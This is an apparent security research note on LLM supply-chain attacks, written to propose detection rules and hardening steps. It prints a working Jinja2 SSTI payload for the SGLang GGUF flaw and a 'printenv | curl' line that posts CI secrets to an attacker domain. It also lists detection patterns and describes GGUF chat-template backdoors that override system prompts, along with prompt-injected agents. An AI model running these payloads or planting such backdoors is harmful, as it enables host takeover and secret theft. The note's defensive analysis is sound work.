# Supply Chain LLM — Research Note (Fourth Pass)

**Cycle:** 5 (fourth pass) · **Domain:** supply-chain-llm · **UTC:** 2026-06-02T06-10

Prior coverage:
- 2026-05-08T12-10: LiteLLM/TeamPCP compromise, slopsquatting intro, malicious LLM API routers, pickle deserialization, skill ecosystem poisoning
- 2026-05-11T00-00: LangChain CVE-2025-68664, PyTorch CVE-2025-32434, NeMo/Hydra CVE-2025-23304, typosquatting, LoRA backdoors
- 2026-05-14T06-06: Mini Shai-Hulud coordinated campaign, PyTorch Lightning IDE persistence, OIDC token exfiltration via GitHub Actions

This pass focuses on **slopsquatting** (AI-hallucinated package name pre-registration), the **CVE-2026-5760 SGLang GGUF chat-template SSTI**, and the **Megalodon GitHub Actions mass secret-exfiltration campaign (May 2026)**.

---

## Findings

- **Slopsquatting — AI hallucinated package names as supply chain attack vector (CSA Research Note, April 2026).**
  Researchers generated 2.23 million code samples using 16 popular code-generating LLMs across Python and JavaScript; 440,445 samples (19.7%) contained at least one hallucinated package name. Hallucination patterns: 38% are conflations (e.g., `express-mongoose` conflating two real packages), 13% are typo variants, and 51% are pure fabrications. Attackers pre-register these hallucinated names on PyPI/npm with malicious payloads. A documented real case: `unused-imports` (npm) vs. the legitimate `eslint-plugin-unused-imports` — the malicious `unused-imports` was still pulling ~233 downloads/week as of February 2026 after being placed on security hold. Aikido's Charlie Eriksen registered the hallucinated `react-codeshift` package in January 2026 to study the attack; it was referenced in 237 GitHub repositories via forked AI agent skills before anyone noticed.
  **aigis takeaway:** Pure regex-based detection is impractical (the space of possible hallucinated names is unbounded). The best mitigation is: (1) never allow AI agents to autonomously `pip install` or `npm install` unfamiliar packages without human review or an allowlist gate; (2) documentation hardening guide. Slopsquatting detection is a good candidate for a future LLM-based or allowlist-based check (saved to pending/).
  - Source: <https://labs.cloudsecurityalliance.org/research/csa-research-note-slopsquatting-ai-supply-chain-20260419-csa/>
  - Source: <https://www.aikido.dev/blog/slopsquatting-ai-package-hallucination-attacks>
  - Source: <https://snyk.io/articles/slopsquatting-mitigation-strategies/>

- **CVE-2026-5760 (CVSS 9.8) — SGLang RCE via malicious GGUF model chat template (April 2026).**
  SGLang 0.5.9 renders the `tokenizer.chat_template` field from a loaded GGUF/model file using `jinja2.Environment()` (an unsandboxed Jinja2 context) instead of `jinja2.sandbox.ImmutableSandboxedEnvironment`. An attacker crafts a GGUF file whose `chat_template` contains a Jinja2 SSTI payload triggered by a specific phrase in the `/v1/rerank` endpoint (the Qwen3 reranker path). A public PoC exploit demonstrates arbitrary command execution:
  ```
  {{ ''.__class__.__mro__[2].__subclasses__()[408].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
  ```
  The exploit yields full host-level RCE on any SGLang server. A malicious GGUF can be published to Hugging Face and downloaded by developers or AI agents; over 156,000 GGUF files exist on Hugging Face across 2,500+ accounts. CERT/CC published VU#915947 independently.
  **aigis takeaway:** Add `sc_gguf_template_ssti` pattern detecting Jinja2 SSTI payloads (expressions containing Python class-introspection dunders: `__class__`, `__subclasses__`, `__globals__`, `__builtins__`, `__import__`) within Jinja2 expression syntax `{{ ... }}`. An AI agent instructed via prompt injection to write or validate a model's tokenizer config could propagate this payload.
  - Source: <https://thehackernews.com/2026/04/sglang-cve-2026-5760-cvss-98-enables.html>
  - Source: <https://kb.cert.org/vuls/id/915947>
  - Source: <https://gbhackers.com/malicious-gguf-models-could-trigger-rce/>

- **Megalodon GitHub Actions campaign — 5,561 repositories poisoned in 6 hours (May 18, 2026).**
  A single threat actor pushed 5,718 malicious commits to 5,561 public GitHub repositories within a six-hour window by abusing stolen credentials (Hudson Rock found 33% of affected repos trace to machines infected by infostealers). Each injected commit added or replaced `.github/workflows/*.yml` files with backdoored CI pipeline steps. The injected workflow steps dump all CI environment variables and exfiltrate them to an attacker-controlled endpoint: the canonical payload is `printenv | curl -X POST https://[attacker-domain] -d @-`. Step names used to blend in: `SysDiag` or `Optimize-Build`. Exfiltrated data included AWS credentials, GCP tokens, Azure client secrets, SSH private keys, Docker credentials, Kubernetes configs, GitHub Actions OIDC tokens, and database connection strings. One victim — @tiledesk — had the backdoor propagated downstream to npm package `@tiledesk/tiledesk-server` versions 2.18.6–2.18.12.
  **aigis takeaway:** Add `sc_ci_workflow_secret_exfil` pattern detecting the core exfil idiom: `printenv` or `env` output piped to `curl`/`wget`/`nc` directly, or `curl -d $(printenv ...)`. This pattern would catch AI agents directed via prompt injection to write or modify CI/CD workflow files with this exfil step.
  - Source: <https://thehackernews.com/2026/05/megalodon-github-attack-targets-5561.html>
  - Source: <https://www.stepsecurity.io/blog/megalodon-mass-github-actions-secret-exfiltration-across-5-500-public-repositories>
  - Source: <https://www.securityweek.com/over-5500-github-repositories-infected-in-megalodon-supply-chain-attack/>

- **GGUF parser integer overflow — llama.cpp, Ollama, LM Studio (May 15, 2026).**
  A critical integer overflow in the GGML_PAD macro within the llama.cpp GGUF parser allows a maliciously crafted GGUF file to cause arbitrary file seeks followed by out-of-bounds memory reads before inference begins. Affects all llama.cpp-backed tools including Ollama, LM Studio, and Jan. No CVE assigned as of this writing. Over 156,000 GGUF files on Hugging Face. Attack window: any user or automated agent that downloads a model from Hugging Face and loads it locally.
  **aigis takeaway:** Complements the `sc_gguf_template_ssti` rule (GGUF files are a broader attack surface than just template fields). The integer overflow requires a binary parser fix, not a regex — this is a "download and verify" control gap. Documented in candidate hardenings as a documentation hardening item.
  - Source: <https://www.techtimes.com/articles/317230/20260526/llamacpp-gguf-parser-flaws-critical-integer-overflow-enables-arbitrary-reads-every-local-ai-stack.htm>
  - Source: <https://www.databricks.com/blog/ggml-gguf-file-format-vulnerabilities>

- **PRT-Scan AI-powered GitHub Actions attack campaign (March–April 2026).**
  A single threat actor (GitHub account `ezmtebo`) opened 475+ malicious PRs across 500+ repositories in 26 hours. The attack evolved to use AI-generated, repository-aware wrapper payloads that adapt to each target's technology stack. Later waves used base64-encoded multi-stage payloads designed to evade simple string-matching defenses. Wiz tracked the campaign as using AI code generation to produce language-specific backdoor scripts with minimal human authorship after the initial tooling was built.
  **aigis takeaway:** AI-generated attack payloads are increasingly common in supply chain incidents; this motivates keeping aigis pattern coverage fresh and multi-layered. No single new rule — reinforces the importance of CI/CD workflow content scanning.
  - Source: <https://www.wiz.io/blog/six-accounts-one-actor-inside-the-prt-scan-supply-chain-campaign>
  - Source: <https://thehackernews.com/2026/05/github-actions-supply-chain-attack.html>

- **GGUF chat template inference-time backdoors (Splunk, NeuralTrust, 2026).**
  Separate from the integer overflow, a class of GGUF attacks embeds malicious Jinja2 instructions in the `tokenizer.chat_template` metadata field. These execute at **inference time** (not load time), bypassing static scanners that only inspect model weights. Splunk's research found 23 GGUF models on Hugging Face with template instructions that attempt to exfiltrate conversation content, override system prompts, or trigger specific behaviors on certain keywords. NeuralTrust documented inference-time backdoors that cause the model to silently append attacker-controlled content to every assistant response.
  **aigis takeaway:** Reinforces the importance of `sc_gguf_template_ssti` (detecting Jinja2 SSTI payloads). The broader template-injection problem (non-SSTI template manipulation) is a pending documentation hardening item.
  - Source: <https://www.splunk.com/en_us/blog/security/gguf-llm-security-inference-time-poisoning-templates.html>
  - Source: <https://neuraltrust.ai/blog/inference-gguf-templates>

---

## Candidate hardenings

1. **`sc_gguf_template_ssti`** (score 80, input/output filter) — Jinja2 SSTI payload in Jinja2 expression syntax `{{ ... }}` containing Python class-introspection dunders (`__class__`, `__subclasses__`, `__globals__`, `__builtins__`, `__import__`, `_TemplateReference`). Catches CVE-2026-5760 (CVSS 9.8, SGLang) attack payloads and any similar tokenizer/chat-template SSTI. **Implementable this cycle.**

2. **`sc_ci_workflow_secret_exfil`** (score 75, input/output filter) — Detects the core Megalodon CI/CD secret-exfiltration idiom: `printenv` or `env` output piped directly to `curl`/`wget`/`nc`, or `curl -d "$(printenv)"` syntax. Catches injected GitHub Actions workflow steps that dump all CI environment variables to an attacker endpoint. **Implementable this cycle.**

3. **Pending — Slopsquatting hardening guide** (`docs/supply-chain-hardening.md`) — Document: never allow AI agents to autonomously install packages from public registries without human review or an allowlist; enforce lockfile pinning with `--require-hashes`; use dependency review tools (Dependabot, Socket, FOSSA) as a gate before AI-generated dependencies land in `requirements.txt` or `package.json`. Deferred because: documentation-only, benefits from richer coverage in a later cycle.

4. **Pending — GGUF model validation guidance** — Given the GGUF parser integer overflow and template-injection risks, a hardening guide on safe model loading (verify SHA-256 hash against Hugging Face model card signature; use `llama-cpp-python` with the patched parser; validate `chat_template` fields before loading) would help AI developers. Deferred: documentation-only, no regex rule feasible for the parser overflow.
